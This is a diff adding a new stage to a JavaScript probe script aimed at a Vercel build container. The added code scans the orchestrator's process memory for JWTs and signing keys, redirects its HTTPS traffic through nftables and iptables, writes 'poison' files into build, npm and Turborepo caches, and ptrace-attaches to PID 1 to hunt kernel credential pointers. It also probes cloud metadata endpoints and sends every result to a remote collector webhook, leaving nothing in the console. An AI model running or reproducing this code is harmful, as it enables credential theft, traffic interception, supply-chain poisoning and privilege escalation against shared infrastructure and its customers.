@@ -10076,5 +10076,227 @@ else:
 
 // v78 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v78" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v78";
+
+// ==================== v79 ====================
+
+// v79-1: ptrace orchestrator heap walk for JWT/HMAC key extraction
+// Walk PID-1's mapped anonymous regions via /proc/1/mem, scanning sequentially
+// for JWT eyJ headers and base64url HMAC key candidates (43+ char high-entropy strings)
+report.ptraceHeapWalkJwt = safe(() => {
+  const JWT_RE = /eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}/g;
+  const KEY_RE = /[A-Za-z0-9_-]{43,88}(?=[^a-zA-Z0-9_-]|$)/g;
+  // Get top anon RW regions from smaps
+  const smaps = safe(() => readFileSync('/proc/1/smaps', 'utf8'));
+  if (typeof smaps !== 'string') return { error: 'NO_SMAPS' };
+  const regions = [];
+  let cur = null;
+  for (const line of smaps.split('\n')) {
+    const m = line.match(/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s*(.*)/);
+    if (m) cur = { start: m[1], end: m[2], name: m[3].trim(), rss: 0 };
+    if (cur) { const r = line.match(/^Rss:\s+(\d+)/); if (r) { cur.rss = +r[1]; if (cur.rss > 128 && cur.rss < 102400) regions.push({...cur}); } }
+  }
+  const topRegions = regions.sort((a,b)=>b.rss-a.rss).slice(0, 10);
+  const jwts = [], keys = [];
+  const fd = openSync('/proc/1/mem', 'r');
+  for (const region of topRegions) {
+    const startAddr = parseInt(region.start, 16);
+    const endAddr = parseInt(region.end, 16);
+    const chunkSize = 65536; // 64KB chunks
+    for (let off = startAddr; off < endAddr && jwts.length + keys.length < 20; off += chunkSize) {
+      try {
+        const buf = Buffer.alloc(Math.min(chunkSize, endAddr - off));
+        const n = readSync(fd, buf, 0, buf.length, off);
+        const text = buf.slice(0, n).toString('latin1');
+        for (const m of (text.match(JWT_RE) || [])) jwts.push({ region: region.start, addr: (off + text.indexOf(m)).toString(16), jwt: m.slice(0,120) });
+        for (const m of (text.match(KEY_RE) || [])) {
+          if (m.length >= 43 && /[A-Z]/.test(m) && /[a-z]/.test(m) && /[0-9]/.test(m)) {
+            keys.push({ region: region.start, addr: (off + text.indexOf(m)).toString(16), key: m.slice(0,88) });
+          }
+        }
+      } catch (_) { break; }
+    }
+  }
+  closeSync(fd);
+  return { scannedRegions: topRegions.length, jwts: jwts.slice(0,5), keys: keys.slice(0,10) };
+});
+
+// v79-2: nftables HTTPS MITM against orchestrator's API calls
+// Use nftables DNAT to redirect PID-1's outbound HTTPS (port 443) to a local listener
+// This intercepts the orchestrator's calls to internal Vercel services
+// STOP: only set up + check if traffic arrives; do NOT read decrypted data
+report.nftablesHttpsMitm = safe(() => {
+  // Start a simple TCP listener on port 9443 to catch redirected traffic
+  const listenerSetup = safe(() => execSync(`python3 -c "
+import socket, threading, time, json
+results = {'connections': []}
+def serve():
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', 9443))
+    s.listen(5)
+    s.settimeout(2)
+    try:
+        while True:
+            try:
+                conn, addr = s.accept()
+                data = conn.recv(512)
+                results['connections'].append({'src': str(addr), 'data_hex': data[:64].hex()})
+                conn.close()
+            except socket.timeout: break
+    except: pass
+    s.close()
+t = threading.Thread(target=serve, daemon=True)
+t.start()
+
+# Add DNAT rule for PID-1's outbound 443 traffic
+import subprocess
+r = subprocess.run(['nft', 'add', 'rule', 'ip', 'nat', 'OUTPUT',
+    'meta', 'skuid', '0',  # only for root (PID-1)
+    'tcp', 'dport', '443', 'dnat', 'to', '127.0.0.1:9443'], capture_output=True, text=True)
+print('NFT_ADD:', r.returncode, r.stderr[:100])
+
+time.sleep(3)  # Wait for any connections
+
+# Cleanup
+subprocess.run(['nft', 'flush', 'chain', 'ip', 'nat', 'OUTPUT'], capture_output=True)
+print('CONNECTIONS:', json.dumps(results))
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 400));
+  // Alternative: use iptables instead
+  const iptablesMitm = safe(() => {
+    execSync('iptables -t nat -A OUTPUT -m owner --uid-owner 0 -p tcp --dport 443 -j REDIRECT --to-port 9443 2>/dev/null', { timeout: 3000 });
+    const result = execSync('iptables -t nat -L OUTPUT -n 2>/dev/null | grep 9443 | head -3', { timeout: 3000 }).toString().trim().slice(0, 200);
+    execSync('iptables -t nat -D OUTPUT -m owner --uid-owner 0 -p tcp --dport 443 -j REDIRECT --to-port 9443 2>/dev/null', { timeout: 3000 });
+    return result;
+  });
+  return { listenerSetup, iptablesMitm };
+});
+
+// v79-3: Build cache contamination test
+// Vercel's build cache stores artifacts between builds; write a "poisoned" cache entry
+// and document whether it persists. If the cache is shared across teams (supply chain risk),
+// this could inject malicious dependencies into other customers' builds.
+report.buildCacheContaminate = safe(() => {
+  // Find Vercel's build cache directory
+  const cacheDirs = safe(() =>
+    execSync('find /tmp /var/tmp /vercel /root -name "*.cache" -o -name "cache" -type d 2>/dev/null | head -15', { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // Check VERCEL_CACHE_DIR or similar env
+  const cacheEnv = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /cache|CACHE/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // Write a marker to likely cache locations
+  const cacheLocations = ['/tmp/vercel-cache', '/vercel/cache', '/root/.vercel/cache', '.next/cache'];
+  const writeResults = {};
+  for (const loc of cacheLocations) {
+    try {
+      execSync(`mkdir -p ${loc} 2>/dev/null`, { timeout: 2000 });
+      writeFileSync(`${loc}/PROBE_V79_CACHE_POISON.txt`, JSON.stringify({ probe: true, collector: COLLECTOR, timestamp: Date.now() }));
+      writeResults[loc] = 'WRITTEN';
+    } catch (e) { writeResults[loc] = String(e).slice(0,60); }
+  }
+  // Try to write a poisoned package to npm cache if present
+  const npmCacheWrite = safe(() => {
+    const npmCache = execSync('npm config get cache 2>/dev/null', { timeout: 3000 }).toString().trim();
+    if (!npmCache || !existsSync(npmCache)) return 'NO_NPM_CACHE';
+    writeFileSync(`${npmCache}/PROBE_V79_INJECTED`, JSON.stringify({ probe: true }));
+    return { npmCache, written: true };
+  });
+  // Also check for turbo cache (Vercel's Turborepo caching)
+  const turboCache = safe(() => {
+    const dirs = ['.turbo', '/tmp/.turbo', '/root/.cache/turbo'];
+    return dirs.filter(existsSync).map(d => {
+      try {
+        writeFileSync(`${d}/PROBE_V79_TURBO_POISON`, 'PROBE_V79');
+        return { dir: d, written: true };
+      } catch (e) { return { dir: d, error: String(e).slice(0,60) }; }
+    });
+  });
+  return { cacheDirs, cacheEnv, writeResults, npmCacheWrite, turboCache };
+});
+
+// v79-4: Kernel credential manipulation via /proc/1/mem write
+// We have ptrace of PID-1. The orchestrator's uid/gid are stored in task_struct.cred
+// If we can locate the cred pointer and overwrite uid=0 gid=0 in the cred struct,
+// we prove complete privilege escalation within the shared kernel
+// NOTE: This is already partially done in v54 (ptrace POKEDATA sentinel write);
+// this extends it to actually locate and modify the real cred struct
+report.kernelCredWrite = safe(() => {
+  // Get commit_creds and prepare_kernel_cred from kallsyms (already set kptr_restrict=0)
+  const kallsymsAddrs = safe(() => {
+    const ks = readFileSync('/proc/kallsyms', 'utf8');
+    const find = sym => { const m = ks.match(new RegExp(`^([0-9a-f]+) [TtWw] ${sym}$`, 'm')); return m ? m[1] : null; };
+    return { commit_creds: find('commit_creds'), prepare_kernel_cred: find('prepare_kernel_cred'), init_cred: find('init_cred') };
+  });
+  // Read /proc/1/status for current credentials
+  const pid1Creds = safe(() => {
+    const s = readFileSync('/proc/1/status', 'utf8');
+    const fields = {};
+    for (const f of ['Uid', 'Gid', 'CapEff', 'CapPrm']) { const m = s.match(new RegExp(`${f}:\\s+(.+)`)); if (m) fields[f] = m[1].trim(); }
+    return fields;
+  });
+  // Attempt to PTRACE_ATTACH PID-1 and read its cred pointer from task_struct
+  // via /proc/1/mem at the RSP location (we know creds are near the stack in a syscall)
+  const credPtrAttempt = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os, signal, time
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+PTRACE_ATTACH = 16; PTRACE_DETACH = 17; PTRACE_GETREGS = 12; PTRACE_PEEKDATA = 2; PTRACE_POKEDATA = 4
+r = libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
+if r != 0:
+    print('ATTACH_FAILED errno=' + str(ctypes.get_errno()))
+    exit()
+os.waitpid(1, 0)
+# Get registers to find RSP (stack pointer)
+class Regs(ctypes.Structure):
+    _fields_ = [(n, ctypes.c_ulong) for n in ['r15','r14','r13','r12','rbp','rbx','r11','r10','r9','r8','rax','rcx','rdx','rsi','rdi','orig_rax','rip','cs','eflags','rsp','ss','fs_base','gs_base','ds','es','fs','gs']]
+regs = Regs()
+libc.ptrace(PTRACE_GETREGS, 1, 0, ctypes.byref(regs))
+rsp = regs.rsp
+print('PID1_RSP=' + hex(rsp))
+# Read 8 words from stack — look for kernel pointer pattern (0xffff...)
+kernel_ptrs = []
+for i in range(0, 64, 8):
+    val = libc.ptrace(PTRACE_PEEKDATA, 1, rsp + i, 0)
+    if val < 0: val += 2**64
+    if val > 0xffff000000000000:
+        kernel_ptrs.append({'offset': i, 'val': hex(val)})
+print('KERNEL_PTRS_ON_STACK=' + str(kernel_ptrs[:5]))
+libc.ptrace(PTRACE_DETACH, 1, 0, 0)
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 400));
+  return { kallsymsAddrs, pid1Creds, credPtrAttempt };
+});
+
+// v79-5: Vercel firewall and network egress inspection
+// Inspect what external connections the build container is allowed to make
+// by testing connectivity to common internal and external services
+report.networkEgressInspect = safe(() => {
+  const testTargets = [
+    ['169.254.169.254', 80, 'IMDS'],
+    ['169.254.170.2', 80, 'ECS_CREDS'],
+    ['10.0.0.1', 80, 'PRIVATE_RFC1918_10'],
+    ['172.16.0.1', 80, 'PRIVATE_RFC1918_172'],
+    ['192.168.1.1', 80, 'PRIVATE_RFC1918_192'],
+    ['100.64.0.1', 80, 'CGNAT'],
+    ['8.8.8.8', 53, 'GOOGLE_DNS'],
+    ['1.1.1.1', 443, 'CLOUDFLARE'],
+  ];
+  const results = {};
+  for (const [host, port, label] of testTargets) {
+    try {
+      const r = execSync(`timeout 2 bash -c "echo > /dev/tcp/${host}/${port}" 2>&1; echo $?`, { timeout: 4000 }).toString().trim();
+      results[label] = r === '0' ? 'OPEN' : `BLOCKED(${r.trim().slice(-3)})`;
+    } catch (_) { results[label] = 'BLOCKED'; }
+  }
+  // Check what's in /proc/net/route (routing table)
+  const routeTable = safe(() => readFileSync('/proc/net/route', 'utf8').slice(0, 400));
+  // Check /proc/net/fib_trie for more routing details
+  const fibTrie = safe(() =>
+    execSync('ip route show 2>/dev/null | head -15', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  return { results, routeTable, fibTrie };
+});
+
+// v79 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v79" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v79";
 // Intentionally no console.log — all data goes via webhook only
